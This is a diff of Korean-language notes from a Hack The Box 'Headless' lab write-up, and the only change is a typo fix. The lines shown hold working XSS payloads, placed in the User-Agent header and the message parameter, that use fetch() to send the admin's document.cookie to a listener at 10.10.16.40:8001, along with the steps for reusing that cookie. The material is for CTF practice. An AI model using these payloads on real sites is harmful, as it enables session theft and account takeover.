@@ -9,7 +9,7 @@ htb: headless
   - 관리자의 쿠키 값이 전송된다
 - 먼저 python3 -m http.server 8001로 쿠키값을 전송받을 서버를 설정한다
 - user-agent에는 <img src=x onerror=fetch('http://10.10.16.40:8001/'+document.cookie);> 설정
-- 파라이터 message에는 <img src=x onerror=fetch('http://10.10.16.40:8001/?c='+document.cookie);> 설정
+- 파라미터 message에는 <img src=x onerror=fetch('http://10.10.16.40:8001/?c='+document.cookie);> 설정
   - 설정하고 전송할 경우 관리자의 쿠키 값이 전달된다
     - 이를 쿠키 값에 설정하고 /dashboard에 접근한다
 <br></br>
